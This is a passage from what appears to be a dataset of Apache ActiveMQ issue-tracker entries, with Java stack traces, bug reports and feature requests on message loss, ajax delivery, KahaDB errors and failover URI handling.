org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113) at org.eclipse.jetty.server.Server.handle(Server.java:351) at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594) at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211) at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506) at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436) at java.lang.Thread.run(Thread.java:662)Caused by: java.lang.IllegalArgumentException: Null object name at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128) at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97) at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217) at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290) at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88) at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206) at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at javax.el.BeanELResolver.getValue(BeanELResolver.java:293) ... 46 more2010-12-15 10:05:38,609 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43javax.el.ELException: java.lang.IllegalArgumentException: Null object name at javax.el.BeanELResolver.getValue(BeanELResolver.java:298) at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175) at com.sun.el.parser.AstValue.getValue(AstValue.java:138) at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206) at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001) at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118) at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118) at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113) at org.eclipse.jetty.server.Server.handle(Server.java:351) at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594) at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211) at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506) at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436) at java.lang.Thread.run(Thread.java:662)Caused by: java.lang.IllegalArgumentException: Null object name at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128) at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97) at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217) at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290) at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88) at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206) at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at javax.el.BeanELResolver.getValue(BeanELResolver.java:293) ... 46 more2010-12-15 10:08:20,771 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43javax.el.ELException: java.lang.IllegalArgumentException: Null object name at javax.el.BeanELResolver.getValue(BeanELResolver.java:298) at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175) at com.sun.el.parser.AstValue.getValue(AstValue.java:138) at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206) at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001) at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118) at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118) at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113) at org.eclipse.jetty.server.Server.handle(Server.java:351) at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594) at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211) at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506) at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436) at java.lang.Thread.run(Thread.java:662)Caused by: java.lang.IllegalArgumentException: Null object name at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128) at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97) at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217) at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290) at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88) at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206) at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at javax.el.BeanELResolver.getValue(BeanELResolver.java:293) ... 46 more
issueID:AMQ-3092
type:Bug
changed files:
texts:Deleting a Queue from the console results in lost messages
After the queue is deleted using JMX, producer messages are lost with even with no execption thrown.
issueID:AMQ-3094
type:Bug
changed files:
texts:ajax client does not receive all messages
Not all messages written to a destination are delivered to an ajax client.  This seems particularly true if more than 1 message should be returned to a client at once.  Often, if 5 messages are available, only the first 1 is actually returned in the <ajax-response> XML.  The other 4 are lost.Steps to reproduce: Place the attached chat-sent.html in activemq/webapps/demo/  (or in activemq-trunk/activemq-web-demo/src/main/webapp in an svn working copy). Start ActiveMQ. Browse to http://localhost:8161/demo/chat.html & join the chat room. In a new window, browse to http://localhost:8161/demo/chat-send.htmlchat-send.html will send 5 message to topic://CHAT.DEMO.  Only 1 (or sometimes 2) messages will be received by the original browser window which is subscribed to the topic.  The activemq web admin will verify that 5 messages were actually sent.
issueID:AMQ-3095
type:Bug
changed files:
texts:Broker policyEntry DurableTopicPrefetch is ignored by default because of connection.optimizedMessageDispatch
By default optimizedMessageDispatch is enabled, which means the prefetch for a durable sub will be 1000, but the broker is checking just for the default value 100 to determine if it will override. The broker needs to check for both 100 and 1000 or optimizedMessageDispatch=false needs to be used on a connection factory.
issueID:AMQ-3097
type:New Feature
changed files:
texts:add Function calls to selectors
As described in the Nabble thread, "custom selector / filter for messages", I have implemented message call support in selectors, together with a few initial functions and the ability to register new functions without modifying the core.Attached is a patch that implements this feature.There are no unit tests currently implemented, but I can provide them in the near future if needed.
issueID:AMQ-3100
type:New Feature
changed files:log4j.properties
AnnotatedMBean.java
texts:Enable audit logging of user activities
For secured environments we should enable track of user actions like: JMX calls Web console actions Http requests
issueID:AMQ-3101
type:Bug
changed files:
texts:Issues in password encryption
I am trying to use security features provided in activemq 5.4.2, I downloaded and extractd the zip file. I am trying the below command to encrypt the password but getting few errors, below are the details ...H:apache-activemq-5.4.2-binapache-activemq-5.4.2>binactivemq encrypt --password activemq --input mypasswordJava Runtime: IBM Corporation 1.6.0 G:IBMIBM-JDKibm_sdk60ibm_sdk60jre  Heap sizes: current=4096k  free=2789k  max=524288k    JVM args: -Xjcl:jclscar_24 -Dcom.ibm.oti.vm.bootstrap.library.path=G:IBMIBM-JDKibm_sdk60ibm_sdk60jrein -Dsun.boot.library.path=G:IBMIBM-JDKibm_sdk60ibm_sdk60jrein -Djava.library.path=G:IBMIBM-JDKibm_sdk60ibm_sdk60jrein;.;C:Perlin;C:Program FilesCommon FilesNetSarang;C:WINDOWSsystem32;C:WINDOWS;C:WINDOWSSystem32Wbem;G:IBMIBM-JDKibm_sdk60ibm_sdk60in;H:Javaapache-ant-1.7.0-binapache-ant-1.7.0in;C:Program FilesWindows Imaging -Djava.home=G:IBMIBM-JDKibm_sdk60ibm_sdk60jre -Djava.ext.dirs=G:IBMIBM-JDKibm_sdk60ibm_sdk60jrelibext -Duser.dir=H:apache-activemq-5.4.2-binapache-activemq-5.4.2 _j2se_j9=71168 -Xdump -Dconsole.encoding=Cp437 -Djava.class.path=.-Dcom.sun.management.jmxremote -Xmx512M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dactivemq.classpath=H:apache-activemq-5.4.2-binapache-activemq-5.4.2/conf;H:apache-activemq-5.4.2-binapache-activemq-5.4.2/conf; -Dactivemq.home=H:apache-activemq-5.4.2-binapache-activemq-5.4.2 -Dactivemq.base=H:apache-activemq-5.4.2-binapache-activemq-5.4.2 -Djava.class.path=H:apache-activemq-5.4.2-binapache-activemq-5.4.2/bin/run.jar -Dsun.java.command=H:apache-activemq-5.4.2-binapache-activemq-5.4.2/bin/run.jar start encrypt --password activemq --input mypassword -Dsun.java.launcher=SUN_STANDARD _port_libraryACTIVEMQ_HOME: H:apache-activemq-5.4.2-binapache-activemq-5.4.2ACTIVEMQ_BASE: H:apache-activemq-5.4.2-binapache-activemq-5.4.2Loading message broker from: encryptERROR: java.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: encryptjava.lang.RuntimeException: Failed to execute start task. Reason: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: encrypt        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:59)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:39)        at java.lang.reflect.Method.invoke(Method.java:612)        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)        at org.apache.activemq.console.Main.main(Main.java:107)Caused by: java.lang.IllegalArgumentException: Invalid broker URI, no scheme specified: encrypt
issueID:AMQ-3105
type:Improvement
changed files:
texts:Require JDK 6
None
issueID:AMQ-3107
type:New Feature
changed files:
texts:Fire advisory when network bridge is starter/stopped
None
issueID:AMQ-3108
type:New Feature
changed files:main.jsp
network.jsp
BrokerFacade.java
BrokerFacadeSupport.java
texts:Show network bridges in web console
Add new tab "Network" with all network bridges listed
issueID:AMQ-3109
type:New Feature
changed files:
texts:Show bridges created by duplex connectors in JMX
None
issueID:AMQ-3115
type:Bug
changed files:DiscardingDLQBrokerPlugin.java
texts:reportInterval property ignored by DiscardingDLQBrokerPlugin
I have a project where I"m trying to use a BrokerService with theDiscardingDLQBrokerPlugin in code, and I don"t want/need the log messagescreated for the number of discarded messages.Eg:broker_serv = new BrokerService();plugins[] = new BrokerPlugin&#91;1&#93;;ddlq_plugin = new DiscardingDLQBrokerPlugin();...ddlq_plugin.setDropAll(true);ddlq_plugin.setReportInterval(0);plugins&#91;0&#93; = ddlq_plugin;broker_serv.setPlugins(plugins);broker_serv.start();Yet, in the DiscardingDLQBrokerPlugin the installPlugin() method doesn"tpass its reportInterval to the DiscardingDLQBroker it creates. So theDiscardingDLQBroker uses its default reportingInterval of 1000, and nomatter what I do with ddlq_plugin.setReportInterval the reportinginterval is always 1000.see http://activemq.2283324.n4.nabble.com/Bug-with-DiscardingDLQBrokerPlugin-reportInterval-Not-Used-td3174509.html
issueID:AMQ-3116
type:Improvement
changed files:
texts:Unicode characters are not shown correctly in message body
When browsing messages in admin, unicode characters in message body are not shown correctly.
issueID:AMQ-3119
type:Bug
changed files:
texts:Proxy connector stop sending messages after failover
If the proxy connector is connected to the remote broker using failover transport like           <proxyConnector bind="tcp://localhost:51618" remote="failover:(tcp://localhost:61616)"                 proxyToLocalBroker="true"                  />and the connection to the remote broker is stopped and started again, the consumer listening to the proxy port will stop receiving messages.However, if openwire cache is disabled on the consumer side, everything works as expectedtcp://localhost:51618?wireFormat.cacheEnabled=false
issueID:AMQ-3120
type:Bug
changed files:
texts:KahaDB error: "Could not locate data file"
I"m using an embedded broker (version 5.4.2) with persistence enabled.  We"re pumping hundreds of millions of messages per day through this thing.  Every once in a while, all of a sudden the KahaDB directory starts growing uncontrollably, and these errors start spewing out in the log over and over...--------------------------ERROR; Jan 5, 2011 16:37:57 PM; tid:BrokerService&#91;localhost&#93; Task; AbstractStoreCursor - Failed to fill batchjava.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:148)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1679)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)Caused by: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)        at org.apache.kahadb.journal.Journal.read(Journal.java:592)        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)        ... 10 moreERROR; Jan 5, 2011 16:37:57 PM; tid:BrokerService&#91;localhost&#93; Task; Queue - Failed to page in more queue messagesjava.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:151)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1679)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)Caused by: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:148)        ... 9 moreCaused by: java.io.IOException: Could not locate data file /usr/local/embedded/activemq-data/localhost/KahaDB/db-28098.log        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)        at org.apache.kahadb.journal.Journal.read(Journal.java:592)        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)        ... 10 more--------------------------It doesn"t happen consistently, but it has happened numerous times.  The only way to "fix" it is to kill the app, blow away the KahaDB data directory, and restart (ugh).Unfortunately this issue is not reproduceable.Here"s the embedded broker config, fwiw:--------------------------  <broker xmlns="http://activemq.apache.org/schema/core"          id="embeddedActivemqBroker"          useJmx="false"          persistent="true"          dataDirectory="/usr/local/embedded/activemq-data"          schedulerSupport="false"          advisorySupport="false"          enableStatistics="true">    <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry queue=">" producerFlowControl="false" memoryLimit="20mb"/>        </policyEntries>      </policyMap>    </destinationPolicy>  </broker>--------------------------
issueID:AMQ-3122
type:Bug
changed files:
texts:Recovery after out of disk space (when space freed up) needs manual intervention
When broker runs out of disk space, the journal excepts and the send fails with an exception as expected. The default IO exception handler ignores the exception. (aside: it is possible to install an exception handler that shuts down the broker: http://activemq.apache.org/configurable-ioexception-handling.html)On restart, the last journal file that failed a write is left with 0 size, this impedes restart recovery as it cannot be parsed.ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.EOFExceptionjava.io.EOFException at java.io.RandomAccessFile.readInt(RandomAccessFile.java:725) at org.apache.kahadb.journal.DataFileAccessor.readLocationDetails(DataFileAccessor.java:115) at org.apache.kahadb.journal.Journal.getNextLocation(Journal.java:498) at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:395) at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321) at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182) at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)
issueID:AMQ-3123
type:Bug
changed files:
texts:ajax client receives incorrect messages when subscribed to multiple topics
When an ajax client is subscribed to multiple topics, the "id" attribute of a returned <response> element indicates to JavaScript which callback function should process the message.  Currently, the MessageListenerServlet returns multiple copies of each message, 1 per subscription.  So all callback functions will receive all messages.For example, if I send messages "A1" and "A2" to /topic/topicA, and messages "B1" and "B2" to /topic/topicB, my ajax client gets the following message:<ajax-response>  <response id="handlerA" destination="topic://topicA" >A1</response>  <response id="handlerA" destination="topic://topicA" >B1</response>  <response id="handlerA" destination="topic://topicA" >A2</response>  <response id="handlerA" destination="topic://topicA" >B2</response>  <response id="handlerB" destination="topic://topicB" >A1</response>  <response id="handlerB" destination="topic://topicB" >B1</response>  <response id="handlerB" destination="topic://topicB" >A2</response>  <response id="handlerB" destination="topic://topicB" >B2</response></ajax-response>Further, these messages are constantly re-delivered to the client.  (They are never removed from the unconsumedMessages linked list in AjaxListener.)If https://issues.apache.org/jira/secure/attachment/12467757/all_messages_are_delivered_to_ajax_clients.patch from https://issues.apache.org/jira/browse/AMQ-3094 is applied, the duplication is reduced, but the "id" values for the "topicB" messages are still incorrect.<ajax-response>  <response id="handlerA" destination="topic://topicA" >A1</response>  <response id="handlerA" destination="topic://topicA" >B1</response>  <response id="handlerA" destination="topic://topicA" >A2</response>  <response id="handlerA" destination="topic://topicA" >B2</response></ajax-response>I"ve attached a test which demonstrates the problem.  This patch will conflict with the one attached to AMQ-3094, but the conflicts should be easy to resolve.
issueID:AMQ-3124
type:Bug
changed files:TransportConnector.java
texts:Failover transport client gets corrupted connectedBrokers data
When clients use the Failover transport, the broker will deliver a list of its own uri and also brokers it peers with to the client.  This happens on initial connection and, if configured, as brokers come in and out of the cluster.The problem is that the entire URI is given, including query string information.  If the query string contains commas in it then the Failover client breaks it up into unusable client uris and will attempt to connect to them.  Also, in 5.4.2, this leads to the same failure that occurs in AMQ-3085.Also, there doesn"t seem to be a point in the client trying to use the same query string parameters that the server is using.Attached patch strips the query string before sending uris to the client.Example:Broker1:        <transportConnectors>            <transportConnector name="openwire+ssl" uri="ssl://0.0.0.0:61616?needClientAuth=true&enabledCipherSuites=SSL_RSA_WITH_RC4_128_SHA,SSL_RSA_WITH_3DES_EDE_CBC_SHA,SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA,SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA" />        </transportConnectors>With a client connecting to:  failover:(ssl://broker1:61616), you will see (extra debugging added by me):&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;0&#93; is: ssl://broker1:61616&#91;DEBUG&#93; FailoverTransport - Reconnect was triggered but transport is not started yet. Wait for start to connect the transport.&#91;DEBUG&#93; FailoverTransport - Started.&#91;DEBUG&#93; FailoverTransport - Waking up reconnect task&#91;DEBUG&#93; FailoverTransport - urlList connectionList:&#91;ssl://broker1:61616&#93;&#91;DEBUG&#93; FailoverTransport - Attempting connect to: ssl://broker1:61616&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;0&#93; is: TLS_RSA_WITH_AES_256_CBC_SHA&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;1&#93; is: TLS_DHE_DSS_WITH_AES_256_CBC_SHA&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;2&#93; is: TLS_RSA_WITH_AES_128_CBC_SHA&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;3&#93; is: TLS_DHE_RSA_WITH_AES_128_CBC_SHA&#91;DEBUG&#93; FailoverTransport - Failover 